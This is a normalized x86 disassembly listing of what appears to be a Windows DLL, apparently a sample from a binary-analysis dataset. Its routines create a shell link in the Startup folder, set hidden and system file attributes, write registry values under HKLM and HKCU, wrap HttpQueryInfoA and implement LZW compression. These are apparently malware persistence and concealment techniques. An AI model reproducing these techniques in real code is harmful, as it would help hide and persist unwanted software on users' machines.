lea eax [ esp + 0x14 ]
push rw-data
push eax
call sub_10010e80
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push 0x1a
lea edx [ esp + 0x14 ]
push rw-data
push edx
call sub_10010e80
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x20 ]
push ecx
call sub_100050d7
add esp 0x4
mov [ edi + 0x42c ] eax
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push 0x11
lea eax [ esp + 0x14 ]
push rw-data
push eax
call sub_10010e80
add esp 0xc
test eax eax
jne r-xdata
mov [ edi + 0x428 ] ebx
jmp r-xdata
mov ecx [ edi + 0x4 ]
lea eax [ esp + 0x10 ]
mov edx [ ecx + 0x8 ]
push edx
push 0x400
push eax
call sub_10010050
add esp 0xc
test eax eax
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov [ edi + 0x1434 ] ebx
sub_10010e10
mov ecx [ rw-data ]
mov eax 0x1
cmp ecx eax
jne r-xdata
mov edx [ esp + 0x8 ]
and edx 0xffff
cmp edx 0x5
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
mov ecx [ esp + 0xc ]
push edx
push eax
push ecx
call [ HttpQueryInfoA@IAT ]
retn 0x14
xor eax eax
retn 0x14
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x42c ]
mov ecx [ esp + 0xc ]
mov [ ecx ] edx
mov edx [ esp + 0x10 ]
mov [ edx ] 0x4
retn 0x14
sub_10010e80
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ebx [ esp + 0x18 ]
mov esi [ esp + 0x14 ]
movsx edx [ esi ]
push edx
call sub_10011860
mov esi eax
movsx eax [ ebx ]
push eax
call sub_10011860
add esp 0x8
sub esi eax
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
dec edi
inc esi
inc ebx
test edi edi
jne r-xdata
movsx eax [ esi ]
push eax
call sub_10011860
movsx ecx [ ebx ]
push ecx
mov ebp eax
call sub_10011860
add esp 0x8
cmp ebp eax
jne r-xdata
sub_10010ef0
sub esp 0x310
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x8 ]
push esi
push edi
mov edi [ esp + 0x320 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x8 ]
push ecx
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
pop edi
pop esi
add esp 0x310
retn
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x31c ]
push ecx
push eax
mov edx [ eax ]
call [ edx + 0x50 ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x324 ]
push ecx
push eax
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
push ecx
push r--data
mov edx [ eax ]
push eax
call [ edx ]
test eax eax
jl r-xdata
lea eax [ esp + 0x110 ]
push 0x104
push eax
lea ecx [ esp + 0x18 ]
push 0xffffffff
push ecx
push 0x1
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0xc ]
lea ecx [ esp + 0x110 ]
push 0x1
push ecx
mov edx [ eax ]
push eax
call [ edx + 0x18 ]
mov esi eax
test esi esi
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push ebx
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
pop ebx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
mov eax [ esp + 0xc ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
sub_10011010
sub esp 0x318
push 0x0
call [ CoInitialize@IAT ]
push 0x0
lea eax [ esp + 0x4 ]
push 0x7
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
lea ecx [ esp ]
push ecx
call [ GetFileAttributesA@IAT ]
or al 0x6
lea edx [ esp ]
push eax
push edx
call [ SetFileAttributesA@IAT ]
mov eax [ esp + 0x31c ]
lea ecx [ esp ]
push eax
push ecx
lea edx [ esp + 0x108 ]
push rw-data
push edx
call sub_1000401e
add esp 0x10
lea eax [ esp + 0x200 ]
lea ecx [ esp + 0x100 ]
push eax
push ecx
call sub_10014190
test eax eax
jne r-xdata
mov eax 0x1
add esp 0x318
retn
mov eax [ esp + 0x320 ]
lea edx [ esp + 0x100 ]
push rw-data
push edx
push eax
call sub_10010ef0
add esp 0xc
test eax eax
jge r-xdata
xor eax eax
add esp 0x318
retn
sub_100110c0
mov eax [ esp + 0x4 ]
sub esp 0x200
lea ecx [ esp ]
push eax
push rw-data
push ecx
call [ wsprintfA@IAT ]
lea edx [ esp + 0x10c ]
push 0x100
push edx
lea eax [ esp + 0x14 ]
push rw-data
push eax
push 0x80000002
call sub_10012f10
add esp 0x220
retn
sub_10011110
sub esp 0x200
push edi
mov edi [ esp + 0x20c ]
test edi edi
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push esi
lea edx [ esp + 0x108 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop esi
lea eax [ esp + 0x104 ]
push 0xff
push eax
push edi
call [ GetModuleFileNameA@IAT ]
jmp r-xdata
xor eax eax
add esp 0x200
retn
push rw-data
lea edx [ esp + 0x4 ]
push r--data
push edx
push 0x80000002
call sub_10012f80
push rw-data
lea eax [ esp + 0x14 ]
push rw-data
push eax
push 0x80000002
call sub_10012f80
push 0x1
lea ecx [ esp + 0x24 ]
push rw-data
push ecx
push 0x80000002
call sub_10013020
push rw-data
lea edx [ esp + 0x34 ]
push rw-data
push edx
push 0x80000001
call sub_10012f80
add esp 0x40
mov eax 0x1
add esp 0x200
retn
mov ecx [ esp + 0x208 ]
lea edx [ esp + 0x4 ]
push ecx
push rw-data
push edx
call [ wsprintfA@IAT ]
lea eax [ esp + 0x110 ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
push 0x80000002
call sub_10012f80
add esp 0x1c
test eax eax
pop edi
je r-xdata
sub_10011220
mov eax [ esp + 0x4 ]
sub esp 0x100
lea ecx [ esp ]
push eax
push rw-data
push ecx
call [ wsprintfA@IAT ]
push rw-data
lea edx [ esp + 0x10 ]
push rw-data
push edx
push 0x80000001
call sub_10012f80
mov eax 0x1
add esp 0x11c
retn
sub_10011260
sub esp 0x18
push esi
call sub_10011360
test eax eax
jge r-xdata
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0x4 ] edx
mov [ esp + 0x18 ] eax
mov [ esp + 0xc ] eax
lea edx [ esp + 0x4 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esi ]
lea eax [ esp + 0x10 ]
push edx
push eax
mov [ esp + 0x10 ] ecx
call sub_10011410
add esp 0x8
test eax eax
jge r-xdata
or eax 0xffffffff
pop esi
add esp 0x18
retn
call sub_100113c0
mov ecx [ esp + 0xc ]
xor eax eax
mov [ esi ] ecx
pop esi
add esp 0x18
retn
call sub_100113c0
or eax 0xffffffff
pop esi
add esp 0x18
retn
sub_100112e0
sub esp 0x18
push esi
call sub_10011360
test eax eax
jge r-xdata
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0x4 ] edx
mov [ esp + 0x18 ] eax
mov [ esp + 0xc ] eax
lea edx [ esp + 0x4 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esi ]
lea eax [ esp + 0x10 ]
push edx
push eax
mov [ esp + 0x10 ] ecx
call sub_10011570
add esp 0x8
test eax eax
jge r-xdata
or eax 0xffffffff
pop esi
add esp 0x18
retn
call sub_100113c0
mov ecx [ esp + 0xc ]
xor eax eax
mov [ esi ] ecx
pop esi
add esp 0x18
retn
call sub_100113c0
or eax 0xffffffff
pop esi
add esp 0x18
retn
sub_10011360
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x4e74
call sub_100049d2
push 0x4e74
mov [ rw-data ] eax
call sub_100049d2
push 0x139d
mov [ rw-data ] eax
call sub_100049d2
mov ecx [ rw-data ]
add esp 0xc
test ecx ecx
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
or eax 0xffffffff
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
xor eax eax
retn
sub_100113c0
mov eax [ rw-data ]
push eax
call sub_1000413e
mov ecx [ rw-data ]
push ecx
call sub_1000413e
mov edx [ rw-data ]
push edx
call sub_1000413e
xor eax eax
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_10011410
mov eax [ rw-data ]
test eax eax
jne r-xdata
push ebx
push ebp
push esi
push edi
mov edi 0x100
xor eax eax
call sub_10011360
mov ecx [ rw-data ]
add eax 0x4
cmp eax 0x4e74
mov [ eax + ecx - 0x4 ] 0xffffffff
jl r-xdata
mov ebp [ esp + 0x14 ]
push ebp
call sub_100116c0
push ebp
mov esi eax
call sub_100116c0
mov ebx eax
add esp 0x8
cmp ebx 0xffffffff
je r-xdata
push esi
mov esi [ esp + 0x1c ]
push esi
call sub_10011790
push 0xfff
push esi
call sub_10011790
push 0x0
push esi
call sub_10011790
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
push esi
call sub_100114f0
mov edx [ rw-data ]
add esp 0x8
mov ecx [ edx + eax * 4 ]
cmp ecx 0xffffffff
je r-xdata
cmp edi 0xffe
ja r-xdata
mov esi ecx
jmp r-xdata
mov edx [ esp + 0x18 ]
push esi
push edx
call sub_10011790
add esp 0x8
test eax eax
jl r-xdata
mov [ edx + eax * 4 ] edi
mov edx [ rw-data ]
inc edi
mov [ edx + eax * 4 ] esi
mov ecx [ rw-data ]
mov [ ecx + eax ] bl
push ebp
call sub_100116c0
mov ebx eax
add esp 0x4
cmp ebx 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov esi ebx
sub_100114f0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push ebx
push ebp
shl eax 0x4
push esi
xor eax ecx
push edi
jne r-xdata
mov ebp 0x139d
sub ebp eax
mov ebp 0x1
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esp + 0x14 ]
mov ebx [ esi ]
cmp ebx edx
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea edi [ ebp * 4 ]
lea esi [ ecx + eax * 4 ]
lea ecx [ edx + eax * 4 ]
sub eax ebp
sub ecx edi
sub esi edi
test eax eax
jge r-xdata
mov ebx [ rw-data ]
xor edx edx
mov dl [ ebx + eax ]
mov ebx [ esp + 0x18 ]
cmp edx ebx
je r-xdata
cmp [ ecx ] 0xffffffff
je r-xdata
add eax 0x139d
add ecx 0x4e74
add esi 0x4e74
jmp r-xdata
sub_10011570
push ecx
mov eax [ rw-data ]
test eax eax
jne r-xdata
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
push esi
mov [ esp + 0x14 ] 0x100
call sub_10011720
mov ebp eax
mov eax [ esp + 0x20 ]
push eax
push ebp
mov ebx ebp
call sub_100116f0
push esi
call sub_10011720
mov edi eax
add esp 0x10
cmp edi 0xfff
je r-xdata
call sub_10011360
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
cmp edi [ esp + 0x10 ]
jb r-xdata
push edi
push rw-data
push ebp
mov [ rw-data ] bl
push rw-data
jmp r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0xffe
jg r-xdata
mov ecx [ esp + 0x1c ]
xor eax eax
mov al [ esi ]
push ecx
push eax
dec esi
call sub_100116f0
add esp 0x8
test eax eax
jl r-xdata
call sub_10011660
mov esi eax
add esp 0x8
xor ebx ebx
cmp esi rw-data
mov bl [ esi ]
jb r-xdata
mov edx [ esp + 0x18 ]
mov ebp edi
push edx
call sub_10011720
mov edi eax
add esp 0x4
cmp edi 0xfff
jne r-xdata
mov edx [ rw-data ]
inc eax
mov [ esp + 0x10 ] eax
mov [ edx + eax * 4 - 0x4 ] ebp
mov ecx [ rw-data ]
mov [ ecx + eax - 0x1 ] bl
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
cmp esi rw-data
jae r-xdata
sub_10011660
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx 0xff
jbe r-xdata
mov [ eax ] cl
pop esi
retn
mov edx [ rw-data ]
inc eax
mov dl [ edx + ecx ]
mov [ eax - 0x1 ] dl
mov edx [ rw-data ]
mov ecx [ edx + ecx * 4 ]
mov edx esi
inc esi
cmp edx 0xffe
jge r-xdata
push rw-data
call sub_10011f31
add esp 0x4
push 0xfffffffd
call sub_100059d6
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
cmp ecx 0xff
ja r-xdata
sub_100116c0
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp eax edx
jg r-xdata
mov eax [ ecx ]
push ebx
xor ebx ebx
mov bl [ edx + eax ]
inc edx
mov eax ebx
mov [ ecx + 0x8 ] edx
pop ebx
retn
or eax 0xffffffff
retn
sub_100116f0
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
cmp edx ecx
jg r-xdata
mov edx [ eax ]
push ebx
mov bl [ esp + 0x8 ]
mov [ ecx + edx ] bl
mov ecx [ eax + 0x8 ]
inc ecx
pop ebx
mov [ eax + 0x8 ] ecx
xor eax eax
retn
or eax 0xffffffff
retn
sub_10011720
mov edx [ rw-data ]
cmp edx 0x18
jg r-xdata
mov ecx [ rw-data ]
sub edx 0xc
mov eax ecx
mov [ rw-data ] edx
shl ecx 0xc
shr eax 0x14
mov [ rw-data ] ecx
retn
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_100116c0
mov edx [ rw-data ]
mov ecx 0x18
sub ecx edx
add edx 0x8
shl eax cl
mov ecx [ rw-data ]
add esp 0x4
mov [ rw-data ] edx
or ecx eax
cmp edx 0x18
mov [ rw-data ] ecx
jle r-xdata
pop esi
sub_10011790
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx 0x14
push esi
mov esi [ esp + 0xc ]
sub ecx edx
shl esi cl
add edx 0xc
mov [ rw-data ] edx
or eax esi
cmp edx 0x8
mov [ rw-data ] eax
jl r-xdata
xor eax eax
pop esi
retn
mov esi [ esp + 0x8 ]
or eax 0xffffffff
pop esi
retn
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub ecx 0x8
shl eax 0x8
cmp ecx 0x8
mov [ rw-data ] eax
mov [ rw-data ] ecx
jge r-xdata
shr eax 0x18
push esi
push eax
call sub_100116f0
add esp 0x8
test eax eax
jl r-xdata
sub_10011860
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x61
jl r-xdata
push [ esp + 0x10 ]
call sub_100118cf
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_10006a09
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x7a
jg r-xdata
push esi
call edi
push 0x13
call sub_10006a6a
pop ecx
jmp r-xdata
sub eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_100118cf
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop ebx
leave
retn
cmp eax 0x7a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
sub eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rw-data ]
call sub_1000931a
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_100119a0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10011a20
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_1000767a
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10011a4f
push [ ebp + 0x14 ]
mov esi eax
call sub_100076cc
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_10011a4f
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_10005e15
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_10007886
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_10004be0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_10009ed8
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
sub_10011b59
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_1000767a
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10011b88
push [ ebp + 0x14 ]
mov esi eax
call sub_100076cc
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_10011b88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
test edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
jmp r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x10c
je r-xdata
cmp ecx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_10011f72
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
mov eax ecx
je r-xdata
cmp ecx eax
mov edi ecx
jb r-xdata
mov eax edi
xor edx edx
sub eax [ ebp + 0x8 ]
div [ ebp + 0xc ]
jmp r-xdata
mov [ ebx ] al
mov eax [ esi + 0x18 ]
inc ebx
dec [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push eax
push ebx
push [ esi + 0x10 ]
call sub_1000ad91
add esp 0xc
test eax eax
je r-xdata
xor edx edx
div [ ebp + 0x14 ]
mov eax ecx
sub eax edx
push edi
push [ esi ]
push ebx
call sub_10004be0
sub [ ebp + 0x8 ] edi
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
add ebx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov edi eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ esi + 0xc ] 0x20
sub [ ebp + 0x8 ] eax
add ebx eax
jmp r-xdata
sub_10011c70
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_1000767a
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10011c9c
push [ ebp + 0x8 ]
mov esi eax
call sub_100076cc
add esp 0x14
mov eax esi
pop esi
pop ebp
retn
sub_10011c9c
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_10004f88
mov [ eax ] 0x16
or eax 0xffffffff
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_10007886
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je r-xdata
push esi
call sub_10011d4b
add [ esp + 0x14 ] eax
pop ecx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ esp + 0x14 ]
push [ esi + 0x10 ]
call sub_10009e00
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
jmp r-xdata
test al 0x8
je r-xdata
pop edi
pop esi
retn
test ah 0x4
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_10011d29
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_1000767a
push esi
call sub_10011d4b
push esi
mov edi eax
call sub_100076cc
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_10011d4b
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0xc ] esi
jge r-xdata
push 0x1
push ebx
push esi
call sub_10009e00
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
or eax 0xffffffff
jmp r-xdata
mov ecx [ edi + 0xc ]
test cx 0x108
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
mov edx [ edi + 0x8 ]
mov ebx eax
sub ebx edx
test cl 0x3
mov [ ebp - 0x8 ] ebx
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test cl 0x80
jne r-xdata
mov ebx esi
mov ecx esi
sar ebx 0x5
and ecx 0x1f
mov ebx [ ebx * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
test [ ebx + ecx * 4 + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_10004f88
mov [ eax ] 0x16
mov ecx edx
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
jne r-xdata
inc ecx
jmp r-xdata
inc [ ebp - 0x8 ]
sub eax edx
add eax ecx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax esi
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ esi + eax + 0x4 ] 0x80
je r-xdata
and [ ebp - 0x8 ] ecx
jmp r-xdata
cmp ecx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0xc ]
call sub_10009e00
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call sub_10009e00
mov eax 0x200
add esp 0xc
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
test [ edi + 0xd ] 0x20
jmp r-xdata
cmp [ eax ] 0xa
jne r-xdata
inc [ ebp + 0x8 ]
test ch 0x4
je r-xdata
je r-xdata
inc eax
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
cmp eax ecx
jae r-xdata
sub_10011eac
push ebp
